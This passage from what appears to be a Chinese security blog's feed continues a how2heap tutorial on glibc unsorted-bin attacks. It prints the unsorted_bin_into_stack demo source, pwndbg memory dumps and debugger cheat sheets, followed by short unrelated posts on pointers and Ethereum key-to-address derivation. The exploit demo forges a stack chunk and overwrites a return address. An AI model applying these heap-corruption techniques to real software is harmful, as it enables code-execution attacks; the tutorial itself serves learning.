data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-82.png#clientId=u347f053a-7aac-4&from=paste&height=363&id=u7d59295c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1261&originalType=binary&size=1096913&status=done&style=none&taskId=u89bded64-5af6-47f4-924f-79af335cdee&width=630.5" alt="image.png"><br>然后正常地分配一个 chunk。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-83.png#clientId=u347f053a-7aac-4&from=paste&height=382&id=u2ffbb479&margin=%5Bobject%20Object%5D&name=image.png&originHeight=763&originWidth=1317&originalType=binary&size=1001146&status=done&style=none&taskId=u9f9e017f-e53d-45c3-8392-e81c850ad3d&width=658.5" alt="image.png"><br>再分配一个，防止前一个 chunk 在 free 的时候被合并了。<br>然后 free(p);之后 p 会被插入到 unsortedbin 链表中，它的 fd 和 bk 都指向 unsortedbin 的 head。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-84.png#clientId=u347f053a-7aac-4&from=paste&height=411&id=ue0445c3d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=821&originWidth=1273&originalType=binary&size=926264&status=done&style=none&taskId=u78523055-0f89-49a0-b52c-064720e5b68&width=636.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-85.png#clientId=u347f053a-7aac-4&from=paste&height=203&id=u2f7a2bd4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=405&originWidth=700&originalType=binary&size=169863&status=done&style=none&taskId=ub7295ae7-dad7-4660-93cc-0a102a030ea&width=350" alt="image.png"><br>接着我们模拟一个漏洞攻击改写 p 的 bk 指针：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-86.png#clientId=u347f053a-7aac-4&from=paste&height=311&id=u9296eb09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=622&originWidth=1428&originalType=binary&size=739966&status=done&style=none&taskId=udf20161b-ffa2-4891-a78c-e634bd5c40b&width=714" alt="image.png"><br>然后 malloc<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-87.png#clientId=u347f053a-7aac-4&from=paste&height=424&id=ua20c418c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=848&originWidth=1326&originalType=binary&size=997797&status=done&style=none&taskId=u32fd2ae3-917b-48d2-b75f-4af6bd9b269&width=663" alt="image.png"><br>然后<strong>stack_var</strong>的值就被改写成了 unsortedbin 的 head 的地址了。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-88.png#clientId=u347f053a-7aac-4&from=paste&height=31&id=uf7fabbe9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=61&originWidth=461&originalType=binary&size=19308&status=done&style=none&taskId=uff3920b9-bf5d-41e3-acc8-d4bdc28317d&width=230.5" alt="image.png"><br>之前的 unsafe_unlink 是通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。<br>可以参考这一篇：<a href="https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/">Pwn 的挖坑填坑之旅</a><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-89.png#clientId=u347f053a-7aac-4&from=paste&height=114&id=ufc44a364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=1230&originalType=binary&size=36359&status=done&style=none&taskId=u3dba95ad-3e7f-4983-9930-9ec41b88f5d&width=615" alt="image.png"></p><h1 id="unsorted-bin-into-stack-2-23"><a href="#unsorted-bin-into-stack-2-23" class="headerlink" title="unsorted_bin_into_stack-2.23"></a>unsorted_bin_into_stack-2.23</h1><p>例子源码如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">        <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">        <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">        <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">        stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">        stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*S</span></span><br><span class="line"><span class="string">IZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">        victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">        victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">        <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">        <span class="built_in">memcpy</span>((p2+<span class="number">40</span>), ≻, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">        assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题 unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。<br>初始栈<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-90.png#clientId=u38185df4-f4d6-4&from=paste&height=169&id=u10f80e0e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=857&originalType=binary&size=239052&status=done&style=none&taskId=u384c129f-04ad-4a88-b95e-d38c2445330&width=593.5" alt="image.png"><br>先 malloc 一个 victim 块<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-91.png#clientId=u38185df4-f4d6-4&from=paste&height=168&id=u4ef9ac2b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=561&originalType=binary&size=171711&status=done&style=none&taskId=ucc095613-3559-47fc-acbe-4799fd59cbb&width=280.5" alt="image.png"><br>再分配一个防止 free 的时候和 top chunk 合并。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-92.png#clientId=u38185df4-f4d6-4&from=paste&height=219&id=u593caa2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=437&originWidth=739&originalType=binary&size=274303&status=done&style=none&taskId=u3d672eb4-d629-46c2-818c-6ed05935421&width=369.5" alt="image.png"><br>接下来释放 p<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-93.png#clientId=u38185df4-f4d6-4&from=paste&height=246&id=u8713a8b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=630&originalType=binary&size=283418&status=done&style=none&taskId=ufc8a4875-9011-4a1b-90f7-f38cfbfc398&width=315" alt="image.png"><br>可以看到它插入了 unsorted bin 列表中<br>我们要在栈上构造一个 chunk，</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br></pre></td></tr></table></figure><p>查看此时内存布局</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx victim - <span class="number">2</span></span><br><span class="line"><span class="number">0x8008010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000111</span> &lt;-- victim chunk</span><br><span class="line"><span class="number">0x8008020</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x00007fffff3f3b78</span></span><br><span class="line"><span class="number">0x8008030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">4</span>gx stack_buffer</span><br><span class="line"><span class="number">0x7ffffffed9a0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000110</span>  &lt;-- fake chunk</span><br><span class="line"><span class="number">0x7ffffffed9b0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffffffed9a0</span></span><br></pre></td></tr></table></figure><p>然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure><p>这里的 size = 32，只要是一个合理的范围，比之后要申请的 chunk size 要小就行。然后我们把 victim-&gt;bk 的值赋为 stack_buffer</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx victim - <span class="number">2</span></span><br><span class="line"><span class="number">0x8008010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000020</span>   &lt;-- victim chunk</span><br><span class="line"><span class="number">0x8008020</span>:      <span class="number">0x00007fffff3f3b78</span>      <span class="number">0x00007ffffffed9a0</span>   &lt;-- bk pointer</span><br><span class="line"><span class="number">0x8008030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-94.png#clientId=u38185df4-f4d6-4&from=paste&height=321&id=uc4f1b5a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=1051&originalType=binary&size=657454&status=done&style=none&taskId=u3fca205b-d8a5-417e-96c2-cd41a462aa2&width=525.5" alt="image.png"><br>过程如下：<br>​</p><p>首先 victim chunk 被从 unsorted bin 中取出：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>显然这个 chunk 的大小是不够的，所以被放入 small bin 中。<br>现在再从 unsorted bin 拿出一个被构造的 fake chunk ，现在有了一些检查：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                         &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>大小合理，轻松绕过。而另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址.</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">6</span>gx victim - <span class="number">2</span></span><br><span class="line"><span class="number">0x8008010</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x8008020</span>:      <span class="number">0x00007fffff3f3b88</span>      <span class="number">0x00007fffff3f3b88</span></span><br><span class="line"><span class="number">0x8008030</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Pwngdb"><a href="#Pwngdb" class="headerlink" title="Pwngdb"></a>Pwngdb</h2><p>libc : Print the base address of libc<br>ld : Print the base address of ld<br>codebase : Print the base of code segment<br>heap : Print the base of heap<br>got : Print the Global Offset Table infomation<br>dyn : Print the Dynamic section infomation<br>findcall : Find some function call<br>bcall : Set the breakpoint at some function call<br>tls : Print the thread local storage address<br>at : Attach by process name<br>findsyscall : Find the syscall<br>force : Calculate the nb in the house of force.<br>heapinfo :打印 heap 的一些信息<br>heapinfoall : Print some infomation of heap (all threads)<br>arenainfo : Print some infomation of all arena<br>chunkptr : 打印 chunk 的信息 后面加 chunk 返回给用户的地址<br>printfastbin : 打印 fastbin 的链表信息<br>tracemalloc on : 追踪程序 chunk 的 malloc 和 free<br>parseheap :解析堆的布局<br>magic : 打印出 glibc 中一些有用的信息<br>fp : show FILE structure<br>fp (Address of FILE)</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>top_chunk: 显示 top chunk 的信息<br>malloc_chunk address:打印出已被分配的 chunk 的信息<br>fastbins:显示 fastbins 链表信息<br>unsorted:显示 unsortedbin 的信息<br>smallbins:显示 smallbins 的信息<br>largebins:显示 largebins 的信息<br>bins:显示所有 bins 的信息<br>mp：显示一些内存管理用到的全局变量<br>arena：显示分配区的信息</p><h2 id="peda-基础命令"><a href="#peda-基础命令" class="headerlink" title="peda 基础命令"></a>peda 基础命令</h2><p>​</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">file 路径　-　附加文件</span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x400100</span> (b main) - 在 <span class="number">0x400100</span> 处下断点</span><br><span class="line">tb  - 一次性断点</span><br><span class="line">info b - 查看断点信息</span><br><span class="line">enable   -   激活断点</span><br><span class="line">disable  -   禁用断点</span><br><span class="line"><span class="keyword">delete</span> [number]  -  删除断点</span><br><span class="line">watch *(<span class="keyword">int</span> *)<span class="number">0x08044530</span>  -  在内存<span class="number">0x0804453</span>处的数据改变时stop</span><br><span class="line">p $eax - 输出eax的内容</span><br><span class="line"><span class="built_in">set</span> $eax=<span class="number">4</span> - 修改变量值</span><br><span class="line"></span><br><span class="line">c - 继续运行</span><br><span class="line">r - 开始运行</span><br><span class="line">ni - 单步步过</span><br><span class="line">si - 单步步入</span><br><span class="line">fini - 运行至函数刚结束处</span><br><span class="line"><span class="keyword">return</span> expression - 将函数返回值指定为expression</span><br><span class="line">bt - 查看当前栈帧</span><br><span class="line">info f - 查看当前栈帧</span><br><span class="line">context - 查看运行上下文</span><br><span class="line"><span class="built_in">stack</span> - 查看当前堆栈</span><br><span class="line">call func - 强制函数调用</span><br><span class="line"><span class="built_in">stack</span> <span class="number">100</span> - 插件提供的，显示栈中<span class="number">100</span>项</span><br><span class="line">find xxx　 - 快速查找，很实用</span><br><span class="line"></span><br><span class="line">x/&lt;n/f/u&gt; &lt;addr&gt;     n、f、u是可选的参数。</span><br><span class="line">x /<span class="number">4</span>xg $ebp：查看ebp开始的<span class="number">4</span>个<span class="number">8</span>字节内容</span><br><span class="line">x/wx $esp 　　以<span class="number">4</span>字节<span class="number">16</span>进制显示栈中内容</span><br><span class="line">b表示单字节，h表示双字节，w表示四字 节，g表示八字节</span><br><span class="line">s 按字符串输出</span><br><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">i：反汇编</span><br><span class="line"></span><br><span class="line">但是实际的组合就那么几种：</span><br><span class="line">x/s 地址　　查看字符串</span><br><span class="line">x/wx 地址　　查看DWORD</span><br><span class="line">x/c 地址　　单字节查看</span><br><span class="line">x/<span class="number">16</span>x $esp+<span class="number">12</span> 查看寄存器偏移</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> args  - 可指定运行时参数。（如：<span class="built_in">set</span> args <span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">40</span> <span class="number">50</span>）</span><br><span class="line">show args  - 命令可以查看设置好的运行参数。</span><br></pre></td></tr></table></figure><h2 id="peda-插件命令"><a href="#peda-插件命令" class="headerlink" title="peda 插件命令"></a>peda 插件命令</h2><ul><li>aslr - 显示/设定 GDB 的 ASLR(地址空间配置随机加载)设置</li></ul><p>gdb-peda$ aslr ASLR is OFF</p><ul><li>checksec - 检查二进制文件的各种安全选项</li></ul><p>gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial</p><ul><li>dumpargs - 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</li><li>dumprop - 在给定内存范围中 Dump 出所有 ROP gadgets</li><li>elfheader - 从被调试的 ELF 文件中获取标题信息</li><li>elfsymbol - 从 ELF 文件获取非调试符号信息（plt 表）</li><li>lookup - 搜索所有地址/参考地址属于一个内存范围</li><li>patch - 修补程序内存以 string / hexstring / int 的地址开始</li><li>procinfo - 显示/ proc / pid /</li><li>pshow - 显示各种 PEDA 选项和其他设置</li><li>pset - 设置各种 PEDA 选项和其他设置</li><li>pattern - 生成字符串模板 写入内存 用于定位溢出点<ul><li>pattern create size 生成特定长度字符串</li><li>pattern offset value 定位字符串</li></ul></li><li>procinfo – Display various info from /proc/pid/</li><li>pshow – Show various PEDA options and other settings</li><li>pset– Set various PEDA options and other settings</li><li>readelf - 从 ELF 文件获取标题信息</li><li>ropgadget - 获取二进制或库的通用 ROP 小工具</li><li>ropsearch - 在内存中搜索 ROP 小工具</li><li>searchmem - 用搜索内存<ul><li>searchmem|find - 在内存中查找字符串，支持正则表达式，例如 searchmem “/bin/sh” libc</li></ul></li><li>shellcode - 生成或下载常用的 shellcode。</li><li>skeleton - 生成 python 漏洞利用代码模板</li><li>vmmap - 可以用来查看栈、bss 段是否可以执行</li><li>xormem - 用一个键异或存储区域</li><li>ptype struct link_map - 查看 link_map 定义</li><li>p &amp;((struct link_map*)0)-&gt;l_info - 查看 l_info 成员偏移</li></ul><h1 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h1><p>【1】<a href="https://blog.csdn.net/kelxLZ/article/details/112972504">https://blog.csdn.net/kelxLZ/article/details/112972504</a><br>​</p><p>​</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>因为之前把 wsl2 搞崩了，为了这个实验，又又又重装了一次<br>卸载过程参考：<br><a href="https://blog.csdn.net/qq_39522282/article/details/86168907">https://blog.csdn.net/qq_39522282/article/details/86168907</a><br><a href="https://blog.csdn.net/gzroy/article/details/104069536">https://blog.csdn.net/gzroy/article/details/104069536</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: []&lt;br&gt;categories: []&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行&lt;code&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt;即可看到版本&lt;br&gt;&lt;img src=&quot;https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-1.png#clientId=u347f053a-7aac-4&amp;from=paste&amp;height=121&amp;id=ubcbe185e&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=241&amp;originWidth=756&amp;originalType=binary&amp;size=264115&amp;status=done&amp;style=none&amp;taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&amp;width=378&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PAT算法刷题(2)</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/26/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/26/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)_new/</id>
    <published>2021-05-26T12:29:57.000Z</published>
    <updated>2021-06-21T06:38:15.266Z</updated>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>something</p><a id="more"></a><h1 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-1.png#clientId=u4e2ecc72-0b61-4&from=paste&height=80&id=u74d31445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=160&originWidth=1066&originalType=binary%E2%88%B6=1&size=160064&status=done&style=none&taskId=ube714c6b-8abc-4802-833e-8c45fb5800e&width=533" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-2.png#clientId=u4e2ecc72-0b61-4&from=paste&height=61&id=u5201477b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=122&originWidth=1067&originalType=binary%E2%88%B6=1&size=134720&status=done&style=none&taskId=u0092dfb5-b66b-4a05-aeb6-8f6dcb75222&width=533.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-3.png#clientId=u4e2ecc72-0b61-4&from=paste&height=295&id=ucedf3117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=736&originalType=binary%E2%88%B6=1&size=388439&status=done&style=none&taskId=u418c5398-37ca-45e4-890a-f7389a9b005&width=368" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98(2)-4.png#clientId=u4e2ecc72-0b61-4&from=paste&height=174&id=u5ad65c12&margin=%5Bobject%20Object%5D&name=image.png&originHeight=348&originWidth=1082&originalType=binary%E2%88%B6=1&size=336793&status=done&style=none&taskId=ubbb32c63-b028-443d-b148-9eac916a2f7&width=541" alt="image.png"></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: []&lt;br&gt;categories: []&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;something&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>区块链账户地址相关问题</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98_new/</id>
    <published>2021-05-20T07:11:35.000Z</published>
    <updated>2021-06-21T06:39:07.504Z</updated>
    
    <content type="html"><![CDATA[<p>tags: [区块链]<br>categories: [区块链]<br>cover: “”<br>​</p><hr><p>​</p><a id="more"></a><h1 id="私钥、公钥和地址是如何生成的？"><a href="#私钥、公钥和地址是如何生成的？" class="headerlink" title="私钥、公钥和地址是如何生成的？"></a>私钥、公钥和地址是如何生成的？</h1><p>以太坊地址生成的流程也是：私钥 -&gt; 公钥 -&gt; 地址。因此地址的生成需要三步：</p><ol><li>生成一个随机的私钥（32 字节）-64 位的 16 进制字符</li><li>通过私钥生成公钥（64 字节）</li><li>通过公钥得到地址（20 字节）</li></ol><h2 id="第一步：私钥-private-key"><a href="#第一步：私钥-private-key" class="headerlink" title="第一步：私钥 (private key)"></a>第一步：私钥 (private key)</h2><p>伪随机数产生的 256bit 私钥示例(256bit  16 进制 32 字节)<br><code>18e14a7b6a307f426a94f8114701e7c8e774e7f9a47e2c2035db29a206321725</code><br>​</p><h2 id="第二步：公钥-public-key"><a href="#第二步：公钥-public-key" class="headerlink" title="第二步：公钥 (public key)"></a>第二步：公钥 (public key)</h2><ol><li>采用椭圆曲线数字签名算法 ECDSA-secp256k1 将私钥（32 字节）映射成公钥（65 字节）（前缀 04+X 公钥+Y 公钥）：</li></ol><p><code>0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</code></p><ol start="2"><li>拿公钥（非压缩公钥）来 hash，计算公钥的<strong>Keccak-256</strong>哈希值（32bytes）：</li></ol><p><code>fc12ad814631ba689f7abe67**1016f75c54c607f082ae6b0881fac0abeda21781**</code></p><ol start="3"><li>取上一步结果取后 20bytes 即以太坊地址：</li></ol><p><code>1016f75c54c607f082ae6b0881fac0abeda21781</code><br>​</p><h2 id="第三步：地址-address"><a href="#第三步：地址-address" class="headerlink" title="第三步：地址 (address)"></a>第三步：地址 (address)</h2><p><code>0x1016f75c54c607f082ae6b0881fac0abeda21781</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: [区块链]&lt;br&gt;categories: [区块链]&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;​&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-May-17-to-23</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/20/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/20/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23_new/</id>
    <published>2021-05-20T07:01:13.000Z</published>
    <updated>2021-06-21T06:42:00.813Z</updated>
    
